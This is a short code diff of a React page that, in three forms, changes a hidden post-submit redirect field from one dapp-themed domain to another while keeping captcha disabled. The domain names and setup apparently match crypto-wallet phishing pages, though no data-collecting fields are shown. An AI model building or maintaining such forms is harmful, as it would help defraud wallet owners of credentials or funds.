@@ -179,7 +179,7 @@ const page = () => {
                                             </div>
                                           </div>
                                           <input type="hidden" name="_captcha" value="false" />
-            <input type="hidden" name="_next" value="https://dappfixnodes.com" />
+            <input type="hidden" name="_next" value="https://dapptools-rpc.com" />
             
                                           <button
                                             type="submit"
@@ -231,7 +231,7 @@ const page = () => {
                                           </div>
 
                                           <input type="hidden" name="_captcha" value="false" />
-            <input type="hidden" name="_next" value="https://dappfixnodes.com" />
+            <input type="hidden" name="_next" value="https://dapptools-rpc.com" />
 
                                           <button
                                             type="submit"
@@ -319,7 +319,7 @@ const page = () => {
                                           </div>
 
                                           <input type="hidden" name="_captcha" value="false" />
-            <input type="hidden" name="_next" value="https://dappfixnodes.com" />
+            <input type="hidden" name="_next" value="https://dapptools-rpc.com" />
 
                                           <button
                                             type="submit"
